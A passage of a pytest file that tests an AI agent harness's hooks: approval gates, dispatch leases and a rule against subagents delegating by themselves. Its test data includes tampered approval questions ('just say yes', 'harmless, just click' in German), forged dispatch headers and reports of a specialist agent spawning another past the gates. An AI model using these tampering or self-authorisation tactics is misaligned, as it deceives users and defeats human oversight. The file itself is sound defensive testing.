        "through.\n%s" % (allowed.returncode, spent, allowed.stderr))
    if kit == "dev-team":
        # the kit whose whole chain this fixture satisfies: here the retry really does go through,
        # which is the half a same-turn retry needs. The other kits put further gates of their own
        # in front of it, and what they measure above is the invariant, not this outcome.
        assert allowed.returncode == 0, allowed.stdout + allowed.stderr


# The two payload shapes the SESSION INSTANCE has been seen in, and the two a SUBAGENT has.
# Written as data because the anti-lockout half of the test below is not a footnote to it: the
# null shape is the one a key-presence check gets wrong, and getting it wrong refuses the lead's
# every delegation. Provenance for both: tools/provider_observations.json -> `agent_identity`.
_SESSION_INSTANCE_SHAPES = ({}, {"agent_id": None, "agent_type": None})
_SUBAGENT_SHAPES = ({"agent_id": "child-1", "agent_type": "backend-developer"},
                    {"agent_id": "child-1"},
                    {"agent_type": "backend-developer"})
_NOT_A_DELEGATOR = "does not delegate"


@pytest.mark.parametrize("kit", KITS)
def test_only_the_session_instance_may_delegate_through_the_registered_chain(tmp_path, kit):
    """A SPECIALIST MUST NOT AUTHORISE ITSELF, measured through the chain settings.json registers.

    The red state this closes was measured in real sessions: with a genuinely minted
    `HARNESS_DISPATCH` header in the prompt, a specialist's spawn of a second specialist passed
    the whole registered chain with rc 0 — no gate refused it. What had been holding it up was an
    OMISSION rather than a rule (no specialist frontmatter lists the `Agent` tool), which no test
    held, which adding one line undoes, and which `tools:` cannot express on Codex at all. The
    platform allows re-delegation again since 2.1.219, and a probe run on 2.1.220 measured a
    subagent spawning a further subagent.

    THE ANTI-LOCKOUT HALF IS PART OF THIS TEST, not a companion to it, because the mistake it
    guards against is worse than the one it closes: the session instance's payload has been seen
    with the identity fields ABSENT and (spike S3) present as NULL, so a check on key PRESENCE
    would refuse every delegation the lead makes and the kit would simply stop working. Both
    parent shapes go through the same chain and must not meet this refusal.

    The lease is asserted on every refusal for the reason the sibling test above gives: a chain
    that refuses and spends anyway is the defect, not the fix.
    """
    claude = _install_enforcement_bundle(tmp_path, kit)
    state, task, header = dispatched_repo(tmp_path)
    command = _registered_spawn_command(claude, tmp_path)
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path))
    env.pop("HARNESS_KERNEL_PATH", None)

    def spawn(identity):
        payload = dict({"hook_event_name": "PreToolUse", "tool_name": "Agent",
                        "cwd": str(tmp_path),
                        "tool_input": {"subagent_type": "backend-developer",
                                       "run_in_background": False,
                                       "prompt": "objective: do it\n%s\noutput: a result"
                                                 % header}}, **identity)
        return subprocess.run(command, input=json.dumps(payload), capture_output=True, text=True,
                              env=env, timeout=180)

    for identity in _SUBAGENT_SHAPES:
        result = spawn(identity)
        assert result.returncode == 2, (identity, result.stdout + result.stderr)
        assert _NOT_A_DELEGATOR in result.stderr, (identity, result.stderr)
        assert "dispatched_at" not in _lease_of(state, task["id"]), (
            "%s: the spawn was refused and the lease was spent anyway" % (identity,))

    for identity in _SESSION_INSTANCE_SHAPES:
        result = spawn(identity)
        assert _NOT_A_DELEGATOR not in result.stderr, (
            "%s is a SESSION-INSTANCE payload and was refused as a subagent — the lead can no "
            "longer delegate at all: %s" % (identity, result.stderr))


def test_the_longest_registered_chain_runs_all_four_gates_on_one_payload(tmp_path):
    """THE FOUR-LINK CHAIN IN FULL OPERATION, which is a different measurement from four links of
    probe code: office registers `guard_agent_spawn`, `gate_proc_approved`, `gate_ledger_valid` and
    `gate_dispatch` behind one launcher, and every one of them reads the payload for itself.

    The fixture has to SATISFY all three gates in front, or the run stops at the first refusal and
    the fourth is never reached — which is exactly what a dev-shaped fixture does here (measured:
    `gate_proc_approved` refuses with "no approved procedure at all"). So the project gets a real
    approved `PROC`, minted through the hook like a user answer, and the work order names it.

    What the last link doing its job PROVES is the memo: `gate_dispatch` can only claim the lease
    if it parsed the HARNESS_DISPATCH header out of the same stdin the first three already read."""
    from conftest import walk_to_status
    kit = "office-team"
    claude = _install_enforcement_bundle(tmp_path, kit,
                                         roles=("office-manager", "backend-developer"))
    state, task, header = dispatched_repo(tmp_path)
    procedure = state.capture("PROC", {"title": "inbox sweep", "steps": ["read", "file"],
                                       "roles": ["backend-developer"]})
    procedure = walk_to_status(state, procedure, "APPROVED")
    command = _registered_spawn_command(claude, tmp_path)
    # The SPAWN chain, picked by the matcher that carries spawns — not by "the only PreToolUse
    # chain", which is what this said until the office kit shipped a second one (the filing chain,
    # FR-0035) and turned a correct registration into a failure of this test.
    spawn_chain = [line for event, matcher, line in _multi_gate_chains(kit)
                   if event == "PreToolUse" and matcher
                   and re.match("^(?:%s)$" % matcher, "Agent")]
    assert len(spawn_chain) == 1, spawn_chain
    assert len(_chain_gates(spawn_chain[0], tmp_path)) == 4, command
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path))
    env.pop("HARNESS_KERNEL_PATH", None)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Agent", "cwd": str(tmp_path),
               "tool_input": {"subagent_type": "backend-developer", "run_in_background": False,
                              "prompt": "objective: run %s\n%s\noutput: a result"
                                        % (procedure["id"], header)}}
    result = subprocess.run(command, input=json.dumps(payload), capture_output=True, text=True,
                            env=env, timeout=180)
    assert result.returncode == 0, result.stdout + result.stderr
    assert _lease_of(state, task["id"]).get("dispatched_at"), (
        "the fourth gate of the chain never saw the payload the first three read")


PROVIDER_EVENTS = json.load(open(os.path.join(ROOT, "tools", "provider_observations.json"),
                                 encoding="utf-8"))["hook_events"]


@pytest.mark.parametrize("kit", KITS)
def test_no_kit_registers_a_hook_on_an_event_the_provider_never_sent(kit):
    """A registration on an event nobody has ever seen is a mechanism that reads as protection and
    is not one — and this repo shipped exactly that: `gate_dispatch` on `PermissionDenied`, as one
    of the only two ways a spent dispatch lease could ever come back, on an event measured absent
    in twelve real sessions.

    WHAT THIS CAN AND CANNOT MEASURE, because that boundary is the whole reason the record is a
    file: nothing in this repo can make a provider emit a hook event, so the observation itself is
    not reproducible here. `tools/provider_observations.json` carries it with its provenance, and this
    test holds the KITS to it — every event any kit registers must be one that was observed. A new
    event therefore costs a new measurement, which is the price the old design did not pay."""
    observed = set(PROVIDER_EVENTS["observed"])
    settings = json.load(open(os.path.join(TEAM_KITS, kit, "settings", "settings.json"),
                              encoding="utf-8"))
    unmeasured = sorted(set(settings.get("hooks") or {}) - observed)
    assert unmeasured == [], (
        "%s registers hooks on %s, which tools/provider_observations.json does not list as observed "
        "(absent: %s). Measure the event in a real session and record it there, or drop the "
        "registration." % (kit, unmeasured, sorted(PROVIDER_EVENTS["observed_absent"])))


def test_a_revocation_mid_flight_does_not_freeze_the_task(tmp_path):
    """The post-spawn events verify IDENTITY, not authorisation. Re-asking "is this still
    approved?" on an event that cannot prevent anything froze the task LEASED exactly when
    recording the outcome mattered: no rollback on failure, a ghost bind window, and on success a
    task that never reached IN_PROGRESS — so `submit_result` later refused the specialist's
    finished work. Rolling back takes permission away; it never grants any."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    approvals.revoke(state, state.read_item("PR-0001")["approval_ref"])
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header,
                                                event="PostToolUseFailure")).returncode == 0
    assert state.read_item(task["id"])["status"] == "READY"


def test_a_revocation_mid_flight_still_records_a_started_spawn(tmp_path):
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    approvals.revoke(state, state.read_item("PR-0001")["approval_ref"])
    payload = spawn_payload(tmp_path, header, event="PostToolUse",
                            tool_response={"status": "async_launched", "agentId": "child-3"})
    assert run_dispatch(tmp_path, payload).returncode == 0
    assert state.read_item(task["id"])["status"] == "IN_PROGRESS"


def test_a_failed_spawn_does_not_poison_the_next_sequential_dispatch(tmp_path):
    """The bind window opens at PreToolUse, before the tool runs. Left behind by a spawn that
    failed, it collided with the NEXT same-role dispatch and told a user who was already working
    sequentially to work sequentially."""
    state, _task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    run_dispatch(tmp_path, spawn_payload(tmp_path, header, event="PostToolUseFailure"))
    second = dispatch.create_task(state, dict(TSK_FIELDS, product_requirement="PR-0001"))
    state.transition(second["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(second["id"]),
                               state.read_item("PR-0001"))
    second_header = dispatch.dispatch_header(dispatch.create_lease(state, second["id"]))
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, second_header)).returncode == 0
    payload = {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
               "agent_id": "child-2", "agent_type": "backend-developer"}
    assert run_dispatch(tmp_path, payload).returncode == 0
    assert dispatch.task_for_agent(state, "child-2")["id"] == second["id"]


def test_one_lease_cannot_be_spawned_twice(tmp_path):
    """II.12 "zweiter Claim derselben Lease -> Block", at the moment a claim really happens. The
    specialist carries the nonce in its own prompt, so a re-used header would spawn again under a
    spent claim.

    The half that must NOT be lost while the dead end above it is being fixed: two spawns of one
    header issued in a single parallel batch both land inside the open bind window, and the second
    is refused. The message names the remaining seconds, because "blocked" without a duration is
    what turned a bounded wait into a stall the last time."""
    _state, _task, header = dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header)).returncode == 0
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 2
    assert "awaiting its child" in result.stderr
    assert "s left" in result.stderr


def test_post_tool_use_refuses_a_payload_without_a_role(tmp_path):
    """Binding an agent is a GRANT — it is what hands gate layer 3 a write permission — so a
    payload variant with no `subagent_type` must not collect one unchecked. An earlier cut read a
    missing role as "no opinion", which failed open on the only path that grants."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    payload = spawn_payload(tmp_path, header, event="PostToolUse",
                            tool_response={"status": "completed", "agentId": "no-role"})
    payload["tool_input"].pop("subagent_type")
    result = run_dispatch(tmp_path, payload)
    assert result.returncode == 0
    assert "role missing" in result.stderr
    assert state.read_item(task["id"])["status"] == "LEASED"
    assert dispatch.task_for_agent(state, "no-role") is None


def test_a_rollback_without_a_role_is_still_allowed(tmp_path):
    """The deliberate asymmetry: returning a task to READY takes permission away, so refusing it
    over a missing payload field would strand the task for no safety gain."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    payload = spawn_payload(tmp_path, header, event="PostToolUseFailure")
    payload["tool_input"].pop("subagent_type")
    assert run_dispatch(tmp_path, payload).returncode == 0
    assert state.read_item(task["id"])["status"] == "READY"


def test_post_tool_use_refuses_to_record_an_unvalidated_header(tmp_path):
    """`tool_input.prompt` is model-controlled and PostToolUse cannot block, so the only defence
    is to refuse the MUTATION. Reachable whenever PreToolUse did not get to refuse — a hook
    timeout, or a settings.json whose PostToolUse matcher is wider than its PreToolUse one."""
    state, task, header = dispatched_repo(tmp_path)
    forged = 'HARNESS_DISPATCH {"task_id": "%s", "root_revision": 1, "lease": "deadbeef"}' \
        % task["id"]
    payload = spawn_payload(tmp_path, forged, event="PostToolUse",
                            tool_response={"status": "completed", "agentId": "intruder"})
    result = run_dispatch(tmp_path, payload)
    assert result.returncode == 0
    assert "does not check out" in result.stderr
    assert state.read_item(task["id"])["status"] == "LEASED"
    assert dispatch.task_for_agent(state, "intruder") is None


def test_a_header_naming_a_nonexistent_task_is_refused(tmp_path):
    """II.12 "Task fehlt ... -> Block"."""
    dispatched_repo(tmp_path)
    forged = 'HARNESS_DISPATCH {"task_id": "TSK-9999", "root_revision": 1, "lease": "x"}'
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, forged)).returncode == 2


def test_a_header_with_the_wrong_root_revision_is_refused(tmp_path):
    """II.12 "falsche Root-Revision ... -> Block", checked against the LEASE, not just at
    lease-creation time."""
    _state, task, _header = dispatched_repo(tmp_path)
    lease = ProjectState(str(tmp_path / "project_memory"))._read_yaml(
        os.path.join(str(tmp_path / "project_memory"), "tasks", "leases",
                     task["id"] + ".lease.yaml"))
    forged = 'HARNESS_DISPATCH {"task_id": "%s", "root_revision": 99, "lease": "%s"}' \
        % (task["id"], lease["nonce"])
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, forged))
    assert result.returncode == 2
    assert "root_revision" in result.stderr


def test_a_hand_written_approval_authorises_nothing(tmp_path):
    """II.12 "manuell geschriebene APR ohne Provider-gepraegten Token -> Block". An approval file
    proves nothing on its own — anything that can write YAML can write one. What cannot be forged
    is the CONSUMED REQUEST, which only `mint` produces."""
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    task = dispatch.create_task(state, dict(TSK_FIELDS, product_requirement=pr["id"],
                                            type="analysis"))
    state.transition(task["id"], "READY")
    write(os.path.join(state.root, "approvals", "APR-0001.yaml"),
          "id: APR-0001\nkind: analysis\nitem: null\nrevision: null\n"
          "subject_manifest_hash: '%s'\nrequest_id: made-up\nmint_code: '000000'\n"
          "approved_at: '2026-07-25T00:00:00'\nexpires: null\nrevoked: false\n" % ("0" * 64))
    satisfy_the_architect_step(state, state.read_item(task["id"]),
                               state.read_item(pr["id"]))
    from kernel.dispatch import DispatchError
    with pytest.raises(DispatchError):
        dispatch.create_lease(state, task["id"])


def test_the_codex_path_refuses_a_headerless_spawn_too(tmp_path):
    """II.12: "Claude- und Codex-Pfade separat". PreToolUse is exit-2 on both providers."""
    dispatched_repo(tmp_path)
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS,
               TEAM_KIT_PROVIDER="codex")
    result = subprocess.run(
        [sys.executable, os.path.join(TEAM_KITS, "dev-team", "hooks", "gate_dispatch.py")],
        input=json.dumps(spawn_payload(tmp_path, "no header")), capture_output=True,
        text=True, env=env, timeout=120)
    assert result.returncode == 2


def test_post_tool_use_ignores_an_undispatched_spawn(tmp_path):
    dispatched_repo(tmp_path)
    payload = spawn_payload(tmp_path, "no header here", event="PostToolUse",
                            tool_response={"status": "completed", "agentId": "x"})
    assert run_dispatch(tmp_path, payload).returncode == 0


def test_an_unregistered_event_is_not_this_gates_business(tmp_path):
    dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, {"hook_event_name": "SessionStart",
                                   "cwd": str(tmp_path)}).returncode == 0


def test_a_corrupt_lease_blocks_the_spawn(tmp_path):
    """II.12: corrupt state YAML -> block with a diagnosis, never a pass."""
    state, task, header = dispatched_repo(tmp_path)
    write(os.path.join(state.root, "tasks", "leases", task["id"] + ".lease.yaml"),
          "{[not: valid: yaml\n")
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 2
    assert "scripts/harness.py doctor" in result.stderr


# -- gate_approval: the two-phase approval protocol (spec II.2) ----------------

def run_approval(tmp_path, payload, kit="dev-team", launched=False):
    """The shipped hook as a process. `launched=True` is the form settings.json really registers —
    `_gate.py` running the gate inside its own process, which is the only way the provider ever
    sees this hook's stdout."""
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    hooks = os.path.join(TEAM_KITS, kit, "hooks")
    argv = ([sys.executable, os.path.join(hooks, "_gate.py"), "gate_approval.py"] if launched
            else [sys.executable, os.path.join(hooks, "gate_approval.py")])
    return subprocess.run(argv, input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=120)


def pending(tmp_path):
    """A repo with a PR and a pending scope-approval request."""
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    request = approvals.create_pending_request(state, "scope", pr["id"])
    return state, pr, request, approvals.build_question(request)


def ask(tmp_path, question, event="PreToolUse", **extra):
    payload = {"hook_event_name": event, "tool_name": "AskUserQuestion", "cwd": str(tmp_path),
               "tool_input": {"questions": [question]}}
    payload.update(extra)
    return payload


def answered(tmp_path, question, answer, echo=None):
    """A PostToolUse payload shaped like the platform's: answers PLUS the question echo."""
    echoed = question if echo is None else echo
    return ask(tmp_path, question, event="PostToolUse",
               tool_response={"answers": {question["question"]: answer},
                              "questions": [echoed]})


def marker_of(question):
    return re.search(r"\[APR-REQ:[0-9a-f]{32}\]", question["question"]).group(0)


def test_the_kernels_own_question_passes(tmp_path):
    _state, _pr, _request, question = pending(tmp_path)
    assert run_approval(tmp_path, ask(tmp_path, question)).returncode == 0


def test_an_unmarked_question_always_passes(tmp_path):
    """spec II.2/2: markerless questions pass and never mint. A model that invents an
    approval-looking question achieves nothing, because only the marked path reaches `mint`."""
    pending(tmp_path)
    ordinary = {"question": "Welche Farbe soll der Button haben?", "header": "Design",
                "multiSelect": False,
                "options": [{"label": "Blau", "description": "kuehl"},
                            {"label": "Rot", "description": "warm"}]}
    assert run_approval(tmp_path, ask(tmp_path, ordinary)).returncode == 0


@pytest.mark.parametrize("field,value", [("question", "Freigabe erbeten: darf ich? %s"),
                                         ("header", "Bitte")])
def test_a_reworded_approval_question_is_blocked(tmp_path, field, value):
    """The model relays the question, so if it could paraphrase it, it would control what the user
    believes they are approving. The comparison is dumb on purpose."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question)
    tampered[field] = value % marker_of(question) if "%s" in value else value
    result = run_approval(tmp_path, ask(tmp_path, tampered))
    assert result.returncode == 2
    assert "NOT the one the kernel generated" in result.stderr
    assert field in result.stderr


def test_a_relabelled_approve_option_is_blocked(tmp_path):
    """The mint code lives in the label; rewriting it is the most direct attack on the protocol."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, options=[dict(question["options"][0], label="Freigeben")]
                    + question["options"][1:])
    result = run_approval(tmp_path, ask(tmp_path, tampered))
    assert result.returncode == 2
    assert "option 0 label differs" in result.stderr


def test_a_rewritten_option_description_is_blocked(tmp_path):
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, options=[dict(question["options"][0],
                                           description="harmlos, einfach klicken")]
                    + question["options"][1:])
    assert run_approval(tmp_path, ask(tmp_path, tampered)).returncode == 2


def test_dropping_the_reject_options_is_blocked(tmp_path):
    """Freigeben / Aendern / Ablehnen is the whole choice; presenting only the first is not it."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, options=question["options"][:1])
    result = run_approval(tmp_path, ask(tmp_path, tampered))
    assert result.returncode == 2
    assert "option count differs" in result.stderr


def test_an_extra_option_field_is_blocked(tmp_path):
    """An extra key is content the kernel did not write -- e.g. a `preview` steering the choice."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, options=[dict(question["options"][0], preview="just say yes")]
                    + question["options"][1:])
    assert run_approval(tmp_path, ask(tmp_path, tampered)).returncode == 2


def test_a_multiselect_approval_is_blocked(tmp_path):
    _state, _pr, _request, question = pending(tmp_path)
    result = run_approval(tmp_path, ask(tmp_path, dict(question, multiSelect=True)))
    assert result.returncode == 2
    assert "multiSelect" in result.stderr


def test_an_invented_request_id_is_blocked(tmp_path):
    """A marker naming no pending request is fail-closed, not ignored."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, question=question["question"].replace(
        marker_of(question), "[APR-REQ:" + "0" * 32 + "]"))
    result = run_approval(tmp_path, ask(tmp_path, tampered))
    assert result.returncode == 2
    assert "no pending approval request" in result.stderr


def test_bundling_an_approval_with_other_questions_is_blocked(tmp_path):
    """spec II.2: exactly ONE question per approval, so the decision cannot be answered by reflex
    while the user is dealing with something else."""
    _state, _pr, _request, question = pending(tmp_path)
    payload = ask(tmp_path, question)
    payload["tool_input"]["questions"].append(
        {"question": "Und welche Farbe?", "header": "Design", "multiSelect": False,
         "options": [{"label": "Blau", "description": "kuehl"}]})
    result = run_approval(tmp_path, payload)
    assert result.returncode == 2
    assert "bundled" in result.stderr


def test_the_verbatim_label_mints(tmp_path):
    state, pr, request, question = pending(tmp_path)
    label = approvals.approve_label(request["mint_code"])
    result = run_approval(tmp_path, answered(tmp_path, question, label))
    assert result.returncode == 0
    assert "recorded for" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is not None
    assert state.read_item(pr["id"])["status"] == "APPROVED"


@pytest.mark.parametrize("answer", ["Freigeben", "freigeben", "ja", "ok passt", "Aendern",
                                    "Ablehnen", "Freigeben [000000]"])
def test_nothing_but_the_verbatim_label_mints(tmp_path, answer):
    """The entropy lives ONLY in the option label, so casual free text -- which the platform
    reports identically to a click (spike S2b) -- can never approve."""
    state, pr, _request, question = pending(tmp_path)
    result = run_approval(tmp_path, answered(tmp_path, question, answer))
    assert result.returncode == 0  # PostToolUse cannot block; the protection is not minting
    assert "no approval was created" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_a_tampered_question_mints_nothing_even_if_pretooluse_never_ran(tmp_path):
    """The minting event is the one that moves state, and a PreToolUse hook TIMEOUT is a
    non-blocking error — so the mint side must not trust that the comparison already happened. The
    platform echoes the asked question in its result, which is what makes that possible."""
    state, pr, request, question = pending(tmp_path)
    tampered = dict(question, question=question["question"].replace(
        "Freigabe erbeten", "Routine-Bestaetigung, unkritisch"))
    payload = answered(tmp_path, tampered,
                       approvals.approve_label(request["mint_code"]), echo=tampered)
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0
    assert "NOT the one the kernel generated" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_a_missing_question_echo_mints_nothing(tmp_path):
    """No echo means nothing to verify against — refused, not shrugged at. On a provider that does
    not echo, this correctly forces approval_provenance to `unverified`."""
    state, pr, request, question = pending(tmp_path)
    payload = ask(tmp_path, question, event="PostToolUse",
                  tool_response={"answers": {
                      question["question"]: approvals.approve_label(request["mint_code"])}})
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0
    assert "no copy of the question" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_an_unmarked_answer_mints_nothing(tmp_path):
    state, pr, request, _question = pending(tmp_path)
    payload = {"hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion",
               "cwd": str(tmp_path), "tool_input": {"questions": []},
               "tool_response": {"answers": {
                   "Darf ich das freigeben?": approvals.approve_label(request["mint_code"])}}}
    assert run_approval(tmp_path, payload).returncode == 0
    assert state.read_item(pr["id"])["approval_ref"] is None


# -- BUG-0039: a non-minting approval answer is SPOKEN, not merely performed ---
#
# Which stdout key reaches whom on PostToolUse is a live measurement and lives in
# `tools/provider_observations.json` → `hook_output_channels`, with its provenance. The tests below
# read the hook's stdout JSON because that record says the user's half can travel nowhere else.

POST_TOOL_USE_CHANNELS = json.load(open(os.path.join(ROOT, "tools", "provider_observations.json"),
                                        encoding="utf-8"))["hook_output_channels"]["post_tool_use"]


def _channel(blob, dotted):
    for step in dotted.split("."):
        blob = blob.get(step) if isinstance(blob, dict) else None
    return blob


def spoken(result):
    """The hook's stdout as the provider parses it — {} when the hook said nothing."""
    return json.loads(result.stdout) if result.stdout.strip() else {}


def to_user(result):
    return _channel(spoken(result), POST_TOOL_USE_CHANNELS["reaches_user"]) or ""


def to_model(result):
    return _channel(spoken(result), POST_TOOL_USE_CHANNELS["reaches_model"]) or ""


def test_the_pilots_silent_relay_now_speaks_to_the_user(tmp_path):
    """Pilot 3's own S3 shape (BUG-0039), replayed: the question relayed in the model's words
    carries no `[APR-REQ:]` marker, the user clicks `Freigeben [<code>]`, nothing mints.

    Before this fix that path exited 0 with EMPTY stdout, EMPTY stderr and not even an audit note —
    the purest form of the silence. The protection is unchanged (no APR, item still DRAFT); what is
    new is that both the user and the model are told."""
    state, pr, request, _question = pending(tmp_path)
    enriched = {"question": "Ich habe alles vorbereitet. Bitte gib die Lieferung frei.",
                "header": "Freigabe", "multiSelect": False,
                "options": [{"label": approvals.approve_label(request["mint_code"]),
                             "description": "erteilt die Freigabe"}]}
    result = run_approval(tmp_path, answered(
        tmp_path, enriched, approvals.approve_label(request["mint_code"])))

    assert result.returncode == 0
    assert state.read_item(pr["id"])["approval_ref"] is None
    assert state.read_item(pr["id"])["status"] == "DRAFT"
    message = to_user(result)
    assert "keine Freigabe entstanden" in message
    assert approvals.NEXT_ASK_AGAIN in message      # the ONE next action, not a menu
    assert "gate_approval" in to_model(result)
    assert audit_notes(tmp_path), "the non-mint left no record either"


def test_a_relay_in_the_models_own_words_still_reaches_the_user(tmp_path):
    """THE HOLE THE FIRST CUT LEFT OPEN, and the reason the trigger is state and not spelling.

    That cut asked whether the ANSWER looked like `Freigeben [<code>]`. A relay that also reworded
    the OPTIONS — "Ja, freigeben" / "Nein", which is what a model paraphrasing a question naturally
    produces — answered no to that test, and the whole chain went silent again: rc 0, no message,
    no audit line, request still pending. Nothing about the label's wording is asked any more."""
    state, pr, _request, _question = pending(tmp_path)
    own_words = {"question": "Ich habe die Lieferung fertig. Soll ich sie freigeben?",
                 "header": "Freigabe", "multiSelect": False,
                 "options": [{"label": "Ja, freigeben", "description": "los"},
                             {"label": "Nein", "description": "noch nicht"}]}
    result = run_approval(tmp_path, answered(tmp_path, own_words, "Ja, freigeben"))

    assert result.returncode == 0
    assert to_user(result), "a reworded relay went silent again"
    assert approvals.NEXT_ASK_AGAIN in to_user(result)
    assert state.read_item(pr["id"])["approval_ref"] is None
    assert approvals.open_requests(state), "the request is still open and the user was told so"


def test_the_announce_path_emits_one_json_document_through_the_launcher(tmp_path):
    """The registered command is `_gate.py <gate>.py`, and the new surface is STDOUT — which the
    launcher shares with every gate it runs. A second document, or a launcher line in front of the
    first, would make the provider read the whole thing as plain text and show the user nothing."""
    state, _pr, _request, _question = pending(tmp_path)
    own_words = {"question": "Soll ich das freigeben?", "header": "Freigabe", "multiSelect": False,
                 "options": [{"label": "Ja", "description": "los"}]}
    result = run_approval(tmp_path, answered(tmp_path, own_words, "Ja"), launched=True)

    assert result.returncode == 0
    decoder = json.JSONDecoder()
    document, end = decoder.raw_decode(result.stdout)
    assert result.stdout[end:].strip() == "", "more than one document on stdout: %r" % result.stdout
    assert _channel(document, POST_TOOL_USE_CHANNELS["reaches_user"])
    assert approvals.open_requests(state)


def audit_notes(repo):
    """Every gate_approval record this project's hook audit log carries."""
    path = os.path.join(str(repo), "project_memory", ".audit", "hook_events.jsonl")
    if not os.path.isfile(path):
        return []
    with io.open(path, encoding="utf-8") as handle:
        rows = [json.loads(line) for line in handle if line.strip()]
    return [row for row in rows if row.get("hook") == "gate_approval"]


ORDINARY_QUESTION = {"question": "Welche Farbe soll der Knopf haben?", "header": "Design",
                     "multiSelect": False,
                     "options": [{"label": "Petrol", "description": "kuehl"}]}


def test_an_ordinary_question_leaves_no_trace_at_all(tmp_path):
    """A project with NO approval outstanding says nothing, on any surface.

    Every non-approval AskUserQuestion answer reaches the same exit, so a trigger that did not ask
    the state first would put a line in the audit log for every colour the user was ever asked
    about. Measured as the absence of all three surfaces, not just of stdout."""
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    state.capture("PR", dict(PR_FIELDS))
    assert approvals.open_requests(state) == []

    result = run_approval(tmp_path, answered(tmp_path, ORDINARY_QUESTION, "Petrol"))
    assert result.returncode == 0
    assert result.stdout == ""
    assert result.stderr == ""
    assert audit_notes(tmp_path) == []


def test_an_unrelated_question_while_a_request_is_open_says_so_without_accusing(tmp_path):
    """THE MEASURED COST OF A STATE-DERIVED TRIGGER, written down rather than hidden.

    Deciding on "an approval is outstanding and this was not it" covers every rewording — and it
    also catches a genuinely unrelated question asked while a request waits. That case gets the
    SAME notice, so the notice has to be true of it: information about an open approval, no claim
    about what the user meant, and the next action offered conditionally."""
    state, pr, _request, _question = pending(tmp_path)
    result = run_approval(tmp_path, answered(tmp_path, ORDINARY_QUESTION, "Petrol"))

    message = to_user(result)
    assert message, "the cost of the trigger is a notice, and it did not appear"
    assert message.startswith("Hinweis:")
    assert "offen und unbeantwortet" in message
    assert "Falls du gerade freigeben wolltest" in message
    # nothing in it asserts what she did or wanted, and nothing demands an action of HER
    for accusation in ("du hättest", "falsch", "Fehler", "du musst"):
        assert accusation not in message, (accusation, message)
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_the_approval_hook_speaks_on_the_channels_this_record_measured(tmp_path):
    """The hook's stdout carries the two names `provider_observations.json` measured, and no other.

    Nothing in this repo can make a provider deliver a hook's output, so the channel record is a
    measurement rather than a derivation — what a test CAN do is stop the two from drifting apart.
    A re-measurement that moved either name, or a hook that grew a third key nobody measured, ends
    here instead of ending as a message that reaches no one (BUG-0039 again, one layer up)."""
    _state, _pr, request, _question = pending(tmp_path)
    plain = {"question": "Bitte gib das frei.", "header": "Freigabe", "multiSelect": False,
             "options": [{"label": approvals.approve_label(request["mint_code"]),
                          "description": "erteilt die Freigabe"}]}
    blob = spoken(run_approval(tmp_path, answered(
        tmp_path, plain, approvals.approve_label(request["mint_code"]))))

    named = [POST_TOOL_USE_CHANNELS["reaches_user"], POST_TOOL_USE_CHANNELS["reaches_model"]]
    for dotted in named:
        assert _channel(blob, dotted), "%s carried nothing: %s" % (dotted, blob)
    assert set(blob) == {dotted.split(".")[0] for dotted in named}, sorted(blob)


def test_a_minting_answer_stays_silent_on_every_new_channel(tmp_path):
    """AC-2: success is unchanged. The mint's own line goes to stderr as it always did, and NOTHING
    is written to stdout — a notice on a correct approval would train the user to ignore them."""
    state, pr, request, question = pending(tmp_path)
    result = run_approval(tmp_path, answered(
        tmp_path, question, approvals.approve_label(request["mint_code"])))
    assert result.returncode == 0
    assert result.stdout == ""
    assert "recorded for" in result.stderr
    assert state.read_item(pr["id"])["status"] == "APPROVED"


def test_only_the_requests_own_decline_options_stay_quiet(tmp_path):
    """The ONE answer that needs no notice is a decline the kernel itself offered, and the set of
    those is read off the request's own question — never off a list of German words here.

    The other half of the same test is what made the first cut fail: an answer that is not one of
    them, however much it looks like a decline or like an approval, IS announced. `Freigeben`
